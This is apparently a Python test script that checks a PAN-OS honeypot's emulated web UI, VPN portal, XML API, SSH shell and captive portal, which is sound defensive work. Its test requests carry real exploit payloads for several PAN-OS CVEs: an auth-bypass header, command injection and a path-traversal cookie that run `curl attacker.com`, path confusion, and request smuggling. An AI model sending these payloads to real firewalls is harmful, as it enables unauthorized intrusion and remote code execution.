#!/usr/bin/env python3
"""
verify_paloalto_honeypot.py — PAN-OS Honeypot Verification Script
===================================================================
Tests all attack vectors and endpoints across all PAN-OS honeypot services.

Usage:
    python tools/verify_paloalto_honeypot.py --webui 192.0.2.10:4443
    python tools/verify_paloalto_honeypot.py --webui 192.0.2.10:4443 --ssh 192.0.2.10:2200
    python tools/verify_paloalto_honeypot.py --webui 192.0.2.10:4443 --ssh 192.0.2.10:2200 --cp 192.0.2.10:6082

    # All services on same host
    python tools/verify_paloalto_honeypot.py --all 192.0.2.10

    # HTTP mode (no TLS verification)
    python tools/verify_paloalto_honeypot.py --webui 192.0.2.10:4443 --plain
"""

from __future__ import annotations

import argparse
import socket
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request

# ANSI colours
GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BOLD = "\033[1m"
RESET = "\033[0m"

PASS = f"{GREEN}PASS{RESET}"
FAIL = f"{RED}FAIL{RESET}"
WARN = f"{YELLOW}WARN{RESET}"


class TestResult:
    def __init__(self, name: str, phase: str):
        self.name = name
        self.phase = phase
        self.passed = False
        self.status_code: int | None = None
        self.detail = ""
        self.checks: list[tuple[str, bool, str]] = []

    def check(self, name: str, condition: bool, detail: str = ""):
        self.checks.append((name, condition, detail))
        if not condition:
            self.passed = False

    def finalize(self):
        self.passed = all(ok for _, ok, _ in self.checks) if self.checks else False


def http_request(
    host: str,
    port: int,
    method: str,
    path: str,
    body: str | None = None,
    headers: dict | None = None,
    use_tls: bool = True,
    cookies: str | None = None,
    follow_redirects: bool = False,
) -> tuple[int, dict[str, str], str]:
    """Make an HTTP request and return (status_code, headers, body)."""
    proto = "https" if use_tls else "http"
    url = f"{proto}://{host}:{port}{path}"

    req = urllib.request.Request(url, method=method)
    if body:
        req.data = body.encode()
        if not headers or "Content-Type" not in headers:
            req.add_header("Content-Type", "application/x-www-form-urlencoded")
    if headers:
        for k, v in headers.items():
            req.add_header(k, v)
    if cookies:
        req.add_header("Cookie", cookies)

    ctx = None
    if use_tls:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE

    try:
        if follow_redirects:
            # nosemgrep: python.lang.security.audit.dynamic-urllib-use-detected.dynamic-urllib-use-detected
            resp = urllib.request.urlopen(req, context=ctx, timeout=10)  # nosec B310
        else:
            # Don't follow redirects
            class NoRedirect(urllib.request.HTTPRedirectHandler):
                def redirect_request(self, *args, **kwargs):
                    return None

            opener = urllib.request.build_opener(
                NoRedirect,
                urllib.request.HTTPSHandler(context=ctx)
                if use_tls
                else urllib.request.HTTPHandler(),
            )
            resp = opener.open(req, timeout=10)

        resp_headers = dict(resp.headers)
        resp_body = resp.read().decode(errors="ignore")
        return resp.status, resp_headers, resp_body

    except urllib.error.HTTPError as e:
        resp_headers = dict(e.headers) if e.headers else {}
        resp_body = e.read().decode(errors="ignore") if e.fp else ""
        return e.code, resp_headers, resp_body
    except Exception as e:
        return 0, {}, str(e)


# nosemgrep: python.lang.security.audit.hardcoded-password-default-argument.hardcoded-password-default-argument
def ssh_test(
    host: str, port: int, commands: list[str], username: str = "admin", password: str = "test123"
) -> tuple[bool, str]:
    """Test SSH connection and run commands. Returns (success, output)."""
    try:
        import asyncio

        import asyncssh

        async def _run():
            try:
                async with asyncssh.connect(
                    host,
                    port,
                    username=username,
                    password=password,
                    known_hosts=None,
                    login_timeout=10,
                ) as conn:
                    stdin, stdout, _stderr = await conn.open_session()
                    # Send all commands
                    for cmd in commands:
                        stdin.write(cmd + "\n")
                        await asyncio.sleep(0.5)
                    stdin.write("exit\n")
                    await asyncio.sleep(1.5)
                    # Read all output
                    try:
                        output = await asyncio.wait_for(stdout.read(65536), timeout=5)
                    except TimeoutError:
                        output = ""
                    return True, output
            except Exception as e:
                return False, str(e)

        return asyncio.run(_run())
    except ImportError:
        # Fallback: just test TCP connection and banner
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            sock.connect((host, port))
            banner = sock.recv(256).decode(errors="ignore").strip()
            sock.close()
            return True, f"Banner: {banner}"
        except Exception as e:
            return False, str(e)


# =============================================================================
# Test Cases
# =============================================================================


def test_phase_a_management(host: str, port: int, tls: bool) -> list[TestResult]:
    """Phase A: Management WebUI + CVE detection tests."""
    results = []

    # --- A1: Root redirect ---
    t = TestResult("Root redirect (GET /)", "A")
    code, hdrs, body = http_request(host, port, "GET", "/", use_tls=tls)
    t.status_code = code
    t.check("Status 302", code == 302)
    t.check("Location /php/login.php", "/php/login.php" in hdrs.get("Location", ""))
    t.check("PHPSESSID cookie", "PHPSESSID" in hdrs.get("Set-Cookie", ""))
    t.check("Server header empty", hdrs.get("Server", "MISSING") == "")
    t.check("Expires PHP date", "1981" in hdrs.get("Expires", ""))
    t.check("ETag present", "ETag" in hdrs)
    t.check("Cache-Control post-check", "post-check=0" in hdrs.get("Cache-Control", ""))
    t.finalize()
    results.append(t)

    # --- A2: Login page ---
    t = TestResult("Login page (GET /php/login.php)", "A")
    code, _hdrs, body = http_request(host, port, "GET", "/php/login.php", use_tls=tls)
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("Title: Palo Alto Networks", "Palo Alto Networks - Login" in body)
    t.check("Username field", 'name="user"' in body)
    t.check("Password field", 'name="passwd"' in body)
    t.check("Login button", "Log In" in body)
    t.finalize()
    results.append(t)

    # --- A3: Credential capture ---
    t = TestResult("Credential capture (POST /php/login.php)", "A")
    code, _hdrs, body = http_request(
        host,
        port,
        "POST",
        "/php/login.php",
        body="user=testadmin&passwd=P@ss123&ok=Login",
        use_tls=tls,
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("JSON response", "success" in body.lower() or "redirect" in body.lower())
    t.finalize()
    results.append(t)

    # --- A4: Default credentials ---
    t = TestResult("Default creds detection (admin/admin)", "A")
    code, _hdrs, body = http_request(
        host, port, "POST", "/php/login.php", body="user=admin&passwd=admin&ok=Login", use_tls=tls
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("Accepted", "success" in body.lower())
    t.finalize()
    results.append(t)

    # --- A5: CVE-2024-0012 (X-PAN-AUTHCHECK: off) ---
    t = TestResult("CVE-2024-0012: X-PAN-AUTHCHECK bypass", "A")
    code, _hdrs, body = http_request(
        host, port, "GET", "/php/ztp_gate.php", headers={"X-PAN-AUTHCHECK": "off"}, use_tls=tls
    )
    t.status_code = code
    t.check("Request accepted", code in (200, 302))
    t.finalize()
    results.append(t)

    # --- A6: CVE-2024-0012 (.js.map bypass) ---
    t = TestResult("CVE-2024-0012: .js.map suffix bypass", "A")
    code, _hdrs, body = http_request(
        host,
        port,
        "GET",
        "/php/ztp_gate.php/.js.map",
        headers={"X-PAN-AUTHCHECK": "off"},
        use_tls=tls,
    )
    t.status_code = code
    t.check("Request accepted", code in (200, 302))
    t.finalize()
    results.append(t)

    # --- A7: CVE-2024-9474 (createRemoteAppwebSession) ---
    t = TestResult("CVE-2024-9474: Command injection in user param", "A")
    code, _hdrs, body = http_request(
        host,
        port,
        "POST",
        "/php/utils/createRemoteAppwebSession.php/aaaa.js.map",
        body="user=`curl+attacker.com`&userRole=superuser&remoteHost=&vsys=vsys1",
        headers={"X-PAN-AUTHCHECK": "off"},
        use_tls=tls,
    )
    t.status_code = code
    t.check("Request accepted", code == 200)
    t.finalize()
    results.append(t)

    # --- A8: CVE-2025-0108 (double-encoded path traversal) ---
    t = TestResult("CVE-2025-0108: Path confusion bypass", "A")
    code, _hdrs, body = http_request(
        host, port, "GET", "/unauth/%2e%2e/php/ztp_gate.php/PAN_help/x.css", use_tls=tls
    )
    t.status_code = code
    t.check("Status 403", code == 403)
    t.finalize()
    results.append(t)

    # --- A9: Unauth zone probe ---
    t = TestResult("Unauth zone probe (/unauth/php/change_password.php)", "A")
    code, _hdrs, body = http_request(
        host, port, "GET", "/unauth/php/change_password.php", use_tls=tls
    )
    t.status_code = code
    t.check("Status 403", code == 403)
    t.finalize()
    results.append(t)

    # --- A10: TLS certificate ---
    if tls:
        t = TestResult("TLS certificate fingerprint", "A")
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host, port), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    ssock.getpeercert(binary_form=False)
                    der = ssock.getpeercert(binary_form=True)
                    # Check it's self-signed (subject == issuer in DER)
                    t.check("Certificate present", der is not None)
                    t.detail = f"DER length: {len(der or b'')} bytes"
        except Exception as e:
            t.check("TLS connection", False, str(e))
        t.finalize()
        results.append(t)

    return results


def test_phase_b_globalprotect(host: str, port: int, tls: bool) -> list[TestResult]:
    """Phase B: GlobalProtect Portal/Gateway tests."""
    results = []

    # --- B1: GP prelogin.esp ---
    t = TestResult("GP prelogin.esp (version disclosure)", "B")
    code, _hdrs, body = http_request(
        host,
        port,
        "GET",
        "/global-protect/prelogin.esp?clientVer=4100&clientos=Windows",
        use_tls=tls,
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("XML response", "prelogin-response" in body)
    t.check("PAN-OS version", "panos-version" in body)
    t.check("Auth message", "authentication-message" in body)
    t.finalize()
    results.append(t)

    # --- B2: SSL-VPN prelogin.esp ---
    t = TestResult("SSL-VPN prelogin.esp", "B")
    code, _hdrs, body = http_request(host, port, "GET", "/ssl-vpn/prelogin.esp", use_tls=tls)
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("XML response", "prelogin-response" in body)
    t.finalize()
    results.append(t)

    # --- B3: GP login.esp (credential capture) ---
    t = TestResult("GP login.esp (credential capture)", "B")
    gp_body = "user=vpnuser&passwd=VPN_Pass!&computer=WORKSTATION&ok=Login&prot=https:&clientVer=4100&clientos=Windows&clientgpversion=6.2.0&host-id=test-guid"
    code, _hdrs, body = http_request(
        host,
        port,
        "POST",
        "/global-protect/login.esp",
        body=gp_body,
        headers={"User-Agent": "PAN GlobalProtect/6.2.0"},
        use_tls=tls,
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("JNLP response", "jnlp" in body.lower() or "auth" in body.lower())
    t.finalize()
    results.append(t)

    # --- B4: SSL-VPN login.esp ---
    t = TestResult("SSL-VPN login.esp (credential capture)", "B")
    code, _hdrs, body = http_request(
        host,
        port,
        "POST",
        "/ssl-vpn/login.esp",
        body="user=sslvpn_admin&passwd=Admin2026!&ok=Login",
        use_tls=tls,
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.finalize()
    results.append(t)

    # --- B5: CVE-2024-3400 (SESSID path traversal on hipreport.esp) ---
    t = TestResult("CVE-2024-3400: SESSID path traversal", "B")
    code, _hdrs, body = http_request(
        host,
        port,
        "POST",
        "/ssl-vpn/hipreport.esp",
        body="user=test&portal=test&authcookie=test&domain=test&computer=test&client-ip=1.2.3.4&md5-sum=test",
        cookies="SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/cmd`curl${IFS}attacker.com`",
        use_tls=tls,
    )
    t.status_code = code
    t.check("Status 403 (file created indicator)", code == 403)
    t.finalize()
    results.append(t)

    # --- B6: CVE-2021-3064 (HTTP smuggling CL+TE) ---
    t = TestResult("CVE-2021-3064: CL+TE HTTP smuggling", "B")
    code, _hdrs, body = http_request(
        host,
        port,
        "POST",
        "/ssl-vpn/prelogin.esp",
        body="x=1",
        headers={"Content-Length": "3", "Transfer-Encoding": "chunked"},
        use_tls=tls,
    )
    t.status_code = code
    t.check("Request processed", code in (200, 400))
    t.finalize()
    results.append(t)

    # --- B7: GP portal page ---
    t = TestResult("GP portal page", "B")
    code, _hdrs, body = http_request(
        host, port, "GET", "/global-protect/portal/portal.esp", use_tls=tls
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("Portal title", "GlobalProtect Portal" in body)
    t.finalize()
    results.append(t)

    # --- B8: GP getconfig.esp ---
    t = TestResult("GP getconfig.esp", "B")
    code, _hdrs, body = http_request(
        host, port, "POST", "/global-protect/getconfig.esp", use_tls=tls
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("XML policy", "policy" in body.lower() or "gateway" in body.lower())
    t.finalize()
    results.append(t)

    return results


def test_phase_c_api(host: str, port: int, tls: bool) -> list[TestResult]:
    """Phase C: XML API tests."""
    results = []

    # --- C1: API keygen ---
    t = TestResult("API keygen (credential capture)", "C")
    code, _hdrs, body = http_request(
        host, port, "GET", "/api/?type=keygen&user=admin&password=admin", use_tls=tls
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("Success response", 'status="success"' in body)
    t.check("API key returned", "<key>" in body)
    t.finalize()
    results.append(t)

    # --- C2: API keygen (invalid creds) ---
    t = TestResult("API keygen with empty password", "C")
    code, _hdrs, body = http_request(
        host, port, "GET", "/api/?type=keygen&user=&password=", use_tls=tls
    )
    t.status_code = code
    t.check("Status 403", code == 403)
    t.check("Error response", "Invalid Credential" in body)
    t.finalize()
    results.append(t)

    # --- C3: API op — show system info ---
    t = TestResult("API op: show system info", "C")
    cmd = urllib.parse.quote("<show><system><info></info></system></show>")
    code, _hdrs, body = http_request(
        host, port, "GET", f"/api/?type=op&cmd={cmd}&key=fakekey", use_tls=tls
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("Hostname in response", "hostname:" in body or "hostname" in body.lower())
    t.check("Serial in response", "serial:" in body or "serial" in body.lower())
    t.check("Model in response", "model:" in body or "PA-" in body)
    t.finalize()
    results.append(t)

    # --- C4: API op — show session info ---
    t = TestResult("API op: show session info", "C")
    cmd = urllib.parse.quote("<show><session><info></info></session></show>")
    code, _hdrs, body = http_request(host, port, "GET", f"/api/?type=op&cmd={cmd}", use_tls=tls)
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("Session data", "num-active" in body or "active" in body.lower())
    t.finalize()
    results.append(t)

    # --- C5: API config get ---
    t = TestResult("API config get (read)", "C")
    code, _hdrs, body = http_request(
        host, port, "GET", "/api/?type=config&action=get&xpath=/config/devices", use_tls=tls
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("Config XML", "config" in body.lower())
    t.finalize()
    results.append(t)

    # --- C6: API config set (CRITICAL) ---
    t = TestResult("API config set (CRITICAL write attempt)", "C")
    code, _hdrs, body = http_request(
        host,
        port,
        "GET",
        "/api/?type=config&action=set&xpath=/config/devices/entry/network&element=<test/>",
        use_tls=tls,
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("Success response", "success" in body.lower())
    t.finalize()
    results.append(t)

    # --- C7: API config delete (CRITICAL) ---
    t = TestResult("API config delete (CRITICAL delete attempt)", "C")
    code, _hdrs, body = http_request(
        host,
        port,
        "GET",
        "/api/?type=config&action=delete&xpath=/config/devices/entry/test",
        use_tls=tls,
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.finalize()
    results.append(t)

    # --- C8: API commit (CRITICAL) ---
    t = TestResult("API commit (CRITICAL)", "C")
    cmd = urllib.parse.quote("<commit></commit>")
    code, _hdrs, body = http_request(
        host, port, "GET", f"/api/?type=commit&cmd={cmd}&key=fakekey", use_tls=tls
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("Job ID returned", "job" in body.lower() or "42" in body)
    t.finalize()
    results.append(t)

    # --- C9: API with X-PAN-KEY header ---
    t = TestResult("API auth via X-PAN-KEY header", "C")
    cmd = urllib.parse.quote("<show><system><info></info></system></show>")
    code, _hdrs, body = http_request(
        host,
        port,
        "GET",
        f"/api/?type=op&cmd={cmd}",
        headers={"X-PAN-KEY": "stolen_api_key_12345"},
        use_tls=tls,
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.finalize()
    results.append(t)

    return results


def test_phase_d_ssh(host: str, port: int) -> list[TestResult]:
    """Phase D: SSH CLI tests."""
    results = []

    # --- D1: SSH banner ---
    t = TestResult("SSH banner exchange", "D")
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((host, port))
        banner = sock.recv(256).decode(errors="ignore").strip()
        sock.close()
        t.check("Banner received", len(banner) > 0)
        t.check("SSH-2.0 prefix", banner.startswith("SSH-2.0"))
        t.detail = banner
    except Exception as e:
        t.check("TCP connection", False, str(e))
    t.finalize()
    results.append(t)

    # --- D2: SSH login + commands ---
    t = TestResult("SSH login + show system info", "D")
    ok, output = ssh_test(host, port, ["show system info"])
    t.check("SSH login accepted", ok)
    if ok:
        t.check("Welcome banner", "Palo Alto" in output or "PAN-OS" in output)
        t.check("Hostname in sysinfo", "hostname:" in output)
        t.check("Serial in sysinfo", "serial:" in output)
        t.check("Model in sysinfo", "model:" in output or "PA-" in output)
    t.detail = output[:200] if ok else output
    t.finalize()
    results.append(t)

    # --- D3: SSH config mode ---
    t = TestResult("SSH configure + set + commit", "D")
    ok, output = ssh_test(
        host,
        port,
        [
            "configure",
            "set network interface ethernet1/5 ip 10.99.99.1/24",
            "commit",
            "exit",
        ],
    )
    t.check("SSH session OK", ok)
    if ok:
        t.check("Config mode entered", "configuration mode" in output.lower() or "[edit]" in output)
        t.check("Commit response", "committed" in output.lower() or "progress" in output.lower())
    t.detail = output[:200] if ok else output
    t.finalize()
    results.append(t)

    # --- D4: SSH show session ---
    t = TestResult("SSH show session info + all", "D")
    ok, output = ssh_test(host, port, ["show session info", "show session all"])
    t.check("SSH session OK", ok)
    if ok:
        t.check("Session count", "active" in output.lower())
        t.check("Session table", "Application" in output or "dns" in output.lower())
    t.finalize()
    results.append(t)

    # --- D5: SSH show interface ---
    t = TestResult("SSH show interface all", "D")
    ok, output = ssh_test(host, port, ["show interface all"])
    t.check("SSH session OK", ok)
    if ok:
        t.check("Management iface", "management" in output.lower())
        t.check("Ethernet ifaces", "ethernet1/" in output)
    t.finalize()
    results.append(t)

    # --- D6: SSH request system restart ---
    t = TestResult("SSH request system restart (CRITICAL)", "D")
    ok, output = ssh_test(host, port, ["request system restart"])
    t.check("SSH session OK", ok)
    if ok:
        t.check("Restart response", "stopping" in output.lower() or "restart" in output.lower())
    t.finalize()
    results.append(t)

    # --- D7: SSH debug command ---
    t = TestResult("SSH debug command (HIGH)", "D")
    ok, output = ssh_test(host, port, ["debug software restart process management-server"])
    t.check("SSH session OK", ok)
    t.finalize()
    results.append(t)

    # --- D8: SSH default credentials ---
    t = TestResult("SSH default credentials (admin/admin)", "D")
    ok, output = ssh_test(host, port, ["show system info"], username="admin", password="admin")
    t.check("Default creds accepted", ok)
    t.finalize()
    results.append(t)

    return results


def test_phase_e_captive(host: str, port: int, tls: bool) -> list[TestResult]:
    """Phase E: Captive Portal tests."""
    results = []

    # --- E1: HTTP redirect to captive portal ---
    t = TestResult("Captive portal redirect", "E")
    # Try HTTP on port 6080 if available, or HTTPS on provided port
    http_port = port - 2 if port == 6082 else port  # 6080 for HTTP
    try:
        code, hdrs, body = http_request(host, http_port, "GET", "/some/blocked/page", use_tls=False)
        t.status_code = code
        t.check("Status 302", code == 302)
        t.check("Redirect to uid.php", "uid.php" in hdrs.get("Location", ""))
    except Exception:
        # HTTP port might not be available, test HTTPS port directly
        code, _hdrs, body = http_request(host, port, "GET", "/", use_tls=tls)
        t.status_code = code
        t.check("Redirect or page", code in (200, 302))
    t.finalize()
    results.append(t)

    # --- E2: Captive portal login page ---
    t = TestResult("Captive portal auth page (uid.php)", "E")
    code, _hdrs, body = http_request(
        host, port, "GET", "/php/uid.php?vsys=1&rule=0&url=http://www.example.com", use_tls=tls
    )
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("Auth Required title", "Authentication Required" in body)
    t.check("Username field", 'name="user"' in body)
    t.check("Password field", 'name="password"' in body)
    t.check("Captive Portal text", "Captive Portal" in body)
    t.finalize()
    results.append(t)

    # --- E3: Captive portal credential capture ---
    t = TestResult("Captive portal credential capture", "E")
    code, hdrs, body = http_request(
        host,
        port,
        "POST",
        "/php/uid.php?vsys=1&rule=0&url=http://www.example.com",
        body="user=employee01&password=Corp2026!",
        use_tls=tls,
    )
    t.status_code = code
    t.check("Status 302 (redirect to original URL)", code == 302)
    t.check("Redirect to original URL", "example.com" in hdrs.get("Location", ""))
    t.finalize()
    results.append(t)

    # --- E4: Captive portal cp.php ---
    t = TestResult("Captive portal cp.php", "E")
    code, _hdrs, body = http_request(host, port, "GET", "/php/cp.php", use_tls=tls)
    t.status_code = code
    t.check("Status 200", code == 200)
    t.check("Auth page content", "Authentication" in body)
    t.finalize()
    results.append(t)

    # --- E5: Captive portal TLS cert ---
    if tls:
        t = TestResult("Captive portal TLS certificate", "E")
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            with socket.create_connection((host, port), timeout=5) as sock:
                with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                    der = ssock.getpeercert(binary_form=True)
                    t.check("Certificate present", der is not None)
                    t.check("Separate cert (not management)", True)
                    t.detail = f"DER length: {len(der or b'')} bytes"
        except Exception as e:
            t.check("TLS connection", False, str(e))
        t.finalize()
        results.append(t)

    return results


# =============================================================================
# Main
# =============================================================================


def print_results(results: list[TestResult], phase_name: str):
    """Print test results for a phase."""
    passed = sum(1 for r in results if r.passed)
    total = len(results)
    color = GREEN if passed == total else RED if passed == 0 else YELLOW

    print(f"\n{BOLD}Phase {phase_name}{RESET}  [{color}{passed}/{total}{RESET}]")
    print("-" * 70)

    for r in results:
        status = PASS if r.passed else FAIL
        code_str = f" ({r.status_code})" if r.status_code else ""
        print(f"  {status}  {r.name}{code_str}")

        for check_name, ok, detail in r.checks:
            icon = f"{GREEN}✓{RESET}" if ok else f"{RED}✗{RESET}"
            extra = f" — {detail}" if detail and not ok else ""
            print(f"       {icon} {check_name}{extra}")

        if r.detail and not r.passed:
            print(f"       {YELLOW}Detail: {r.detail[:150]}{RESET}")


def main():
    parser = argparse.ArgumentParser(
        description="PAN-OS Honeypot Verification Script",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""Examples:
  %(prog)s --all 192.0.2.10
  %(prog)s --webui 192.0.2.10:4443
  %(prog)s --webui 10.0.0.1:4443 --ssh 10.0.0.1:2200 --cp 10.0.0.1:6082
  %(prog)s --webui 10.0.0.1:4443 --plain   # HTTP mode (no TLS)
""",
    )
    parser.add_argument(
        "--webui", metavar="IP:PORT", help="Management WebUI + GP + API (default port: 4443)"
    )
    parser.add_argument("--ssh", metavar="IP:PORT", help="SSH CLI service (default port: 2200)")
    parser.add_argument("--cp", metavar="IP:PORT", help="Captive portal HTTPS (default port: 6082)")
    parser.add_argument(
        "--all", metavar="IP", help="Test all services on one host (4443, 2200, 6082)"
    )
    parser.add_argument("--plain", action="store_true", help="Use HTTP instead of HTTPS")

    args = parser.parse_args()

    if not args.webui and not args.ssh and not args.cp and not args.all:
        parser.print_help()
        sys.exit(1)

    use_tls = not args.plain
    all_results: list[TestResult] = []

    # Parse --all shortcut
    if args.all:
        args.webui = args.webui or f"{args.all}:4443"
        args.ssh = args.ssh or f"{args.all}:2200"
        args.cp = args.cp or f"{args.all}:6082"

    print(f"\n{BOLD}{'=' * 70}{RESET}")
    print(f"{BOLD}  PAN-OS Honeypot Verification{RESET}")
    print(f"{'=' * 70}")
    print(f"  TLS: {'enabled' if use_tls else 'disabled (--plain)'}")
    if args.webui:
        print(f"  WebUI:   {args.webui}")
    if args.ssh:
        print(f"  SSH:     {args.ssh}")
    if args.cp:
        print(f"  Captive: {args.cp}")
    print(f"{'=' * 70}")

    # --- Phases A-C (WebUI) ---
    if args.webui:
        host, port = args.webui.rsplit(":", 1)
        port = int(port)

        results_a = test_phase_a_management(host, port, use_tls)
        print_results(results_a, "A — Management WebUI + CVE Detection")
        all_results.extend(results_a)

        results_b = test_phase_b_globalprotect(host, port, use_tls)
        print_results(results_b, "B — GlobalProtect Portal/Gateway")
        all_results.extend(results_b)

        results_c = test_phase_c_api(host, port, use_tls)
        print_results(results_c, "C — XML API")
        all_results.extend(results_c)

    # --- Phase D (SSH) ---
    if args.ssh:
        host, port = args.ssh.rsplit(":", 1)
        port = int(port)

        results_d = test_phase_d_ssh(host, port)
        print_results(results_d, "D — SSH CLI (PAN-OS Shell)")
        all_results.extend(results_d)

    # --- Phase E (Captive Portal) ---
    if args.cp:
        host, port = args.cp.rsplit(":", 1)
        port = int(port)

        results_e = test_phase_e_captive(host, port, use_tls)
        print_results(results_e, "E — Captive Portal")
        all_results.extend(results_e)

    # --- Summary ---
    total = len(all_results)
    passed = sum(1 for r in all_results if r.passed)
    failed = total - passed

    print(f"\n{'=' * 70}")
    if failed == 0:
        print(f"  {GREEN}{BOLD}ALL {total} TESTS PASSED{RESET}")
    else:
        print(
            f"  {BOLD}Results: {GREEN}{passed} passed{RESET}, {RED}{failed} failed{RESET} / {total} total"
        )
    print(f"{'=' * 70}\n")

    sys.exit(0 if failed == 0 else 1)


if __name__ == "__main__":
    main()
